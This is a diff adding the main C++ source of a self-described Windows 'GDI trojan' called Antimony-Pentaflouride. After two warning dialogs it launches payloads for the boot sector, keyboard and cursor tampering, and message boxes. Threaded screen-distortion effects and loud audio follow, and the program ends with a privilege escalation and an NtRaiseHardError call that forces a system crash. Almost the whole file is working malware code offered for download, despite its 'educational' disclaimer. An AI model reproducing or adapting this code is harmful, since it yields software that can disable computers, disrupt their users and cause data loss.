@@ -1,0 +1,146 @@
+#include "include.h"
+#include "system.h"
+#include "colors.h"
+#include "maths.h"
+#include "bytebeats.h"
+#include "boot.h"
+#include "payloads.h"
+
+typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+	if (MessageBoxW(NULL, L"WARNING!!!\n\nYou're about to run a safe version of a potentially harmful program that can cause your system's death & data loss. This program also displays flashing lights and plays loud sounds.\n\nBy running this program, you accept full responsibility for any damages that may occur. The creator (Danilo a.k.a Danoni) will not be responsible for anything caused by this software. By the way, this was created for educational and entertainment purposes.\n\nOriginal download: github.com/Danoni631/GDI-Trojan.Win32.Antimony-Pentaflouride\n\nWould you like to proceed with running this program?", L"'Seeking what was go to explode, and was a corrosive acid...'", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
+	if (MessageBoxW(NULL, L"LAST WARNING!!!\n\nThis is the LAST warning, as you're already aware of the risks, press 'Yes' to continue. Otherwise, press 'No'. Also be sure you're running in a safe environment, like virtual machines.\n\nProceed at your own risk...\n\nNote: This is a layered malware", L"GDI-Trojan.Win32.Antimony-Pentaflouride - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
+	SysPayloads::Messdesktop(NULL);
+	SysPayloads::MessedLabels(NULL);
+	SysPayloads::Bootsector(NULL);
+    SysPayloads::KeyboardCAPS(NULL);
+	SysPayloads::CursorMove(NULL);
+    SysPayloads::Msgbox(NULL);
+    HANDLE hBB1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat1 = CreateThread(NULL, NULL, &Bytebeats::Sound1, hBB1, NULL, NULL);
+    HANDLE hPML1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload1 = CreateThread(NULL, NULL, &GDIPayloads::Reset, hPML1, NULL, NULL);
+    HANDLE hPML2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload2 = CreateThread(NULL, NULL, &GDIPayloads::Circles, hPML2, NULL, NULL);
+    HANDLE hPML3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload3 = CreateThread(NULL, NULL, &GDIPayloads::Shader1, hPML3, NULL, NULL);
+    Sleep(20000);
+	System::EndPayload(hPayload2, hPML2);
+    System::EndPayload(hPayload3, hPML3);
+    System::EndPayload(hBytebeat1, hBB1);
+    HANDLE hPML4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload4 = CreateThread(NULL, NULL, &GDIPayloads::Shake, hPML4, NULL, NULL);
+    HANDLE hPML5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload5 = CreateThread(NULL, NULL, &GDIPayloads::InvertCircles, hPML5, NULL, NULL);
+    HANDLE hBB2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat2 = CreateThread(NULL, NULL, &Bytebeats::Sound2, hBB2, NULL, NULL);
+    Sleep(20000);
+	System::EndPayload(hPayload4, hPML4);
+	System::EndPayload(hPayload5, hPML5);
+    HANDLE hPML6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload6 = CreateThread(NULL, NULL, &GDIPayloads::Icons, hPML6, NULL, NULL);
+    HANDLE hPML7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload7 = CreateThread(NULL, NULL, &GDIPayloads::Shader1, hPML7, NULL, NULL);
+    HANDLE hBB3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat3 = CreateThread(NULL, NULL, &Bytebeats::Sound3, hBB3, NULL, NULL);
+    Sleep(20000);
+    System::EndPayload(hPayload6, hPML6);
+    System::EndPayload(hPayload7, hPML7);
+    HANDLE hPML8 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload8 = CreateThread(NULL, NULL, &GDIPayloads::Bright, hPML8, NULL, NULL);
+    HANDLE hBB4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat4 = CreateThread(NULL, NULL, &Bytebeats::Sound4, hBB4, NULL, NULL);
+    Sleep(20000);
+    System::EndPayload(hPayload8, hPML8);
+    HANDLE hPML9 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload9 = CreateThread(NULL, NULL, &GDIPayloads::Texts, hPML9, NULL, NULL);
+    HANDLE hPML10 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload10 = CreateThread(NULL, NULL, &GDIPayloads::Shader2, hPML10, NULL, NULL);
+    HANDLE hBB5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat5 = CreateThread(NULL, NULL, &Bytebeats::Sound5, hBB5, NULL, NULL);
+    Sleep(20000);
+	System::EndPayload(hPayload9, hPML9);
+	System::EndPayload(hPayload10, hPML10);
+    HANDLE hPML11 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload11 = CreateThread(NULL, NULL, &GDIPayloads::Waves, hPML11, NULL, NULL);
+    HANDLE hPML12 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload12 = CreateThread(NULL, NULL, &GDIPayloads::Colors1, hPML12, NULL, NULL);
+	HANDLE hPML13 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+	HANDLE hPayload13 = CreateThread(NULL, NULL, &GDIPayloads::Icons, hPML13, NULL, NULL);
+    HANDLE hPML14 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload14 = CreateThread(NULL, NULL, &GDIPayloads::Tesseract, hPML14, NULL, NULL);
+    HANDLE hBB6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat6 = CreateThread(NULL, NULL, &Bytebeats::Sound6, hBB6, NULL, NULL);
+    Sleep(20000);
+    System::RedrawScreen();
+	System::EndPayload(hPayload11, hPML11);
+	System::EndPayload(hPayload12, hPML12);
+	System::EndPayload(hPayload13, hPML13);
+    HANDLE hPML15 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload15 = CreateThread(NULL, NULL, &GDIPayloads::Shader4, hPML15, NULL, NULL);
+    HANDLE hBB7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat7 = CreateThread(NULL, NULL, &Bytebeats::Sound7, hBB7, NULL, NULL);
+    Sleep(20000);
+    System::EndPayload(hPayload15, hPML15);
+    HANDLE hPML16 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload16 = CreateThread(NULL, NULL, &GDIPayloads::Neon, hPML16, NULL, NULL);
+    HANDLE hBB8 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat8 = CreateThread(NULL, NULL, &Bytebeats::Sound8, hBB8, NULL, NULL);
+    Sleep(20000);
+	System::EndPayload(hPayload16, hPML16);
+    HANDLE hPML17 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload17 = CreateThread(NULL, NULL, &GDIPayloads::Masher, hPML17, NULL, NULL);
+    HANDLE hPML18 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload18 = CreateThread(NULL, NULL, &GDIPayloads::Shader1, hPML18, NULL, NULL);
+    HANDLE hBB9 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat9 = CreateThread(NULL, NULL, &Bytebeats::Sound9, hBB9, NULL, NULL);
+    Sleep(20000);
+	System::EndPayload(hPayload17, hPML17);
+	System::EndPayload(hPayload18, hPML18);
+    HANDLE hPML19 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload19 = CreateThread(NULL, NULL, &GDIPayloads::InvertCircles, hPML19, NULL, NULL);
+    HANDLE hPML20 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload20 = CreateThread(NULL, NULL, &GDIPayloads::Inverting, hPML20, NULL, NULL);
+    HANDLE hPML21 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload21 = CreateThread(NULL, NULL, &GDIPayloads::Shake, hPML21, NULL, NULL);
+    HANDLE hBB10 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat10 = CreateThread(NULL, NULL, &Bytebeats::Sound10, hBB10, NULL, NULL);
+    Sleep(20000);
+    System::RedrawScreen();
+    System::EndPayload(hPayload19, hPML19);
+    System::EndPayload(hPayload20, hPML20);
+    HANDLE hPML22 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload22 = CreateThread(NULL, NULL, &GDIPayloads::Shader3, hPML22, NULL, NULL);
+    HANDLE hBB11 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat11 = CreateThread(NULL, NULL, &Bytebeats::Sound11, hBB11, NULL, NULL);
+    Sleep(20000);
+    System::EndPayload(hPayload21, hPML21);
+    System::EndPayload(hPayload22, hPML22);
+    HANDLE hPML23 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload23 = CreateThread(NULL, NULL, &GDIPayloads::Colors2, hPML23, NULL, NULL);
+    HANDLE hPML24 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload24 = CreateThread(NULL, NULL, &GDIPayloads::Icons, hPML24, NULL, NULL);
+    HANDLE hPML25 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload25 = CreateThread(NULL, NULL, &GDIPayloads::Texts, hPML25, NULL, NULL);
+    HANDLE hPML26 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload26 = CreateThread(NULL, NULL, &GDIPayloads::Stretch, hPML26, NULL, NULL);
+    HANDLE hPML27 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload27 = CreateThread(NULL, NULL, &GDIPayloads::Cursors, hPML27, NULL, NULL);
+    HANDLE hPML28 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hPayload28 = CreateThread(NULL, NULL, &GDIPayloads::Circles, hPML28, NULL, NULL);
+    HANDLE hBB12 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
+    HANDLE hBytebeat12 = CreateThread(NULL, NULL, &Bytebeats::Sound12, hBB12, NULL, NULL);
+    Sleep(20000);
+    BOOLEAN bl;
+    DWORD response;
+    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
+    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
+    RtlAdjustPrivilege(19, 1, 0, &bl);
+    NtRaiseHardError(0xC00002D1, 0, 0, 0, 6, &response);
+    Sleep(-1);
+    return 0;
+}
